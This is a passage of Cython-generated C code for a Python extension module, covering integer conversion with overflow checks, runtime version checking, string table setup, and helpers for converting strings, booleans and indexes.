                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long)(((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int)(((int)-1) * (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int)((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long)(((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int)(((int)-1) * (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int)((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long)(((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int)(((int)-1) * (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        }
                        else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int)((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                }
#endif
                if (sizeof(int) <= sizeof(long)) {
                    __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
                }
                else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                    __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
                }
            }
            {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
                PyErr_SetString(PyExc_RuntimeError,
                    "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
                int val;
                PyObject* v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
                if (likely(v) && !PyLong_Check(v)) {
                    PyObject* tmp = v;
                    v = PyNumber_Long(tmp);
                    Py_DECREF(tmp);
                }
#endif
                if (likely(v)) {
                    int one = 1; int is_little = (int)*(unsigned char*)&one;
                    unsigned char* bytes = (unsigned char*)&val;
                    int ret = _PyLong_AsByteArray((PyLongObject*)v,
                        bytes, sizeof(val),
                        is_little, !is_unsigned);
                    Py_DECREF(v);
                    if (likely(!ret))
                        return val;
                }
#endif
                return (int)-1;
            }
        }
        else {
            int val;
            PyObject* tmp = __Pyx_PyNumber_IntOrLong(x);
            if (!tmp) return (int)-1;
            val = __Pyx_PyInt_As_int(tmp);
            Py_DECREF(tmp);
            return val;
        }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int)-1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int)-1;
}
static CYTHON_INLINE int __Pyx_StrEq(const char* s1, const char* s2) {
    while (*s1 != '\0' && *s1 == *s2) { s1++; s2++; }
    return *s1 == *s2;
}
static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same = 1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = { '\0' };
        char message[200];
        for (i = 0; i < 4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            }
            else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
            "compiletime version %s of module '%.100s' "
            "does not match runtime version %s",
            ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}
static int __Pyx_InitStrings(__Pyx_StringTabEntry * t) {
    while (t->p) {
#if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        }
        else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        }
        else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
#else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            }
            else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            }
            else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        }
        else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
#endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject * o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject * o, Py_ssize_t * length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char)(*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    * length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject * o, Py_ssize_t * length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    }
    else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject * o, Py_ssize_t * length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
        __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
        PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    }
    else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
        if (PyByteArray_Check(o)) {
            *length = PyByteArray_GET_SIZE(o);
            return PyByteArray_AS_STRING(o);
        }
        else
#endif
        {
            char* result;
            int r = PyBytes_AsStringAndSize(o, &result, length);
            if (unlikely(r < 0)) {
                return NULL;
            }
            else {
                return result;
            }
        }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject * x) {
    int is_true = x == Py_True;
    if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
    else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject * x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject * result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
            "__int__ returned non-int (type %.200s).  "
            "The ability to return an instance of a strict subclass of int "
            "is deprecated, and may be removed in a future version of Python.",
            Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
        "__%.4s__ returned non-%.4s (type %.200s)",
        type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject * x) {
#if CYTHON_USE_TYPE_SLOTS
    PyNumberMethods* m;
#endif
    const char* name = NULL;
    PyObject* res = NULL;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
    if (likely(PyLong_Check(x)))
#endif
        return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
    m = Py_TYPE(x)->tp_as_number;
#if PY_MAJOR_VERSION < 3
    if (m && m->nb_int) {
        name = "int";
        res = m->nb_int(x);
    }
    else if (m && m->nb_long) {
        name = "long";
        res = m->nb_long(x);
    }
#else
    if (likely(m && m->nb_int)) {
        name = "int";
        res = m->nb_int(x);
    }
#endif
#else
    if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
        res = PyNumber_Int(x);
    }
#endif
    if (likely(res)) {
#if PY_MAJOR_VERSION < 3
        if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
        if (unlikely(!PyLong_CheckExact(res))) {
#endif
            return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
        }
        }
    else if (!PyErr_Occurred()) {
        PyErr_SetString(PyExc_TypeError,
            "an integer is required");
    }
    return res;
    }
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject * b) {
    Py_ssize_t ival;
    PyObject* x;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(b))) {
        if (sizeof(Py_ssize_t) >= sizeof(long))
            return PyInt_AS_LONG(b);
        else
            return PyInt_AsSsize_t(b);
    }
#endif
    if (likely(PyLong_CheckExact(b))) {
#if CYTHON_USE_PYLONG_INTERNALS
        const digit* digits = ((PyLongObject*)b)->ob_digit;
        const Py_ssize_t size = Py_SIZE(b);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            ival = likely(size) ? digits[0] : 0;
            if (size == -1) ival = -ival;
            return ival;
        }
        else {
            switch (size) {
            case 2:
                if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
                    return (Py_ssize_t)(((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            case -2:
                if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
                    return -(Py_ssize_t)(((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            case 3:
                if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
                    return (Py_ssize_t)(((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            case -3:
                if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
                    return -(Py_ssize_t)(((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            case 4:
                if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
                    return (Py_ssize_t)(((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            case -4:
                if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
                    return -(Py_ssize_t)(((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
                }
                break;
            }
        }
#endif
        return PyLong_AsSsize_t(b);
    }
    x = PyNumber_Index(b);
    if (!x) return -1;
    ival = PyInt_AsSsize_t(x);
    Py_DECREF(x);
    return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject * o) {
    if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
        return (Py_hash_t)__Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
    }
    else if (likely(PyInt_CheckExact(o))) {
        return PyInt_AS_LONG(o);
#endif
    }
    else {
        Py_ssize_t ival;
        PyObject* x;
        x = PyNumber_Index(o);
        if (!x) return -1;
        ival = PyInt_AsLong(x);
        Py_DECREF(x);
        return ival;
    }
}
static CYTHON_INLINE PyObject* __Pyx_PyBool_FromLong(long b) {
    return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject* __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif
